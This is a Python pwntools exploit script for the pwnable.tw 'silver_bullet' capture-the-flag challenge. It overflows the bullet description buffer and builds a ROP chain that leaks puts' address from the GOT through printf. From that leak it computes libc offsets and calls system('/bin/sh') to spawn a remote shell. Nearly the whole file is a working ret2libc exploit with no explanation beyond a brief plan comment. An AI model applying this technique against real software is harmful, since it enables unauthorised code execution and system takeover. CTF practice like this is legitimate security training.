from pwn import *

'''
plan:
1.read address of puts:
    printf(0x08048c85, 0x80484a8)  ( or printf("+ NAME : %s\n", puts_addr) )
2.calc system function addr and /bin/sh addr from puts addr
3.call main and exploit it again
4.call system("/bin/sh")
'''

PRINT_FORMAT = 0x08048BAB
SYSTEM_OFFSET = 0x0003a940
BIN_SH_OFFSET = 0x00158e8b
PUTS_OFFSET = 0x0005f140

def create_bullet(description):
    conn.sendline(b"1")
    conn.sendline(description)

    return conn.recv(1024).decode()

def power_up(description):
    conn.sendline(b"2")
    conn.sendline(description)
    
    return conn.recv(1024).decode()

def beat_werewolf():
    conn.sendline(b"3")
    
    return conn.recv(1024).decode()

def exploit_main(rop_chain):
    create_bullet(b"A" * 47)

    power_up(b"A")

    payload = b"A" * 7 # padding
    payload += rop_chain # rop chain

    power_up(payload)

    for _ in range(2):
        beat_werewolf()


conn = remote("chall.pwnable.tw", 10103) # remote conn
#conn = process("./silver_bullet") # debug conn

elf = ELF("./silver_bullet")

stage1 = p32(elf.plt["printf"]) # call to printf
stage1 += p32(elf.symbols["main"]) # ret to main
stage1 += p32(PRINT_FORMAT) # "NAME : %s" format str
stage1 += p32(elf.got["puts"]) # address of puts

exploit_main(stage1)

recv = conn.recv(2048, timeout=5) # get puts virtual address
recv = recv.split(b"+ NAME : ")[-1][:4]

puts_vaddr = u32(recv)
print(f"puts addr: {hex(puts_vaddr)}")

libc_base = puts_vaddr - PUTS_OFFSET # calc libc base
print(f"libc base: {hex(libc_base)}")

stage2 = p32(libc_base + SYSTEM_OFFSET) # call to system
stage2 += b"AAAA" # junk ret addr
stage2 += p32(libc_base + BIN_SH_OFFSET) # "/bin/sh"

exploit_main(stage2)

conn.interactive()
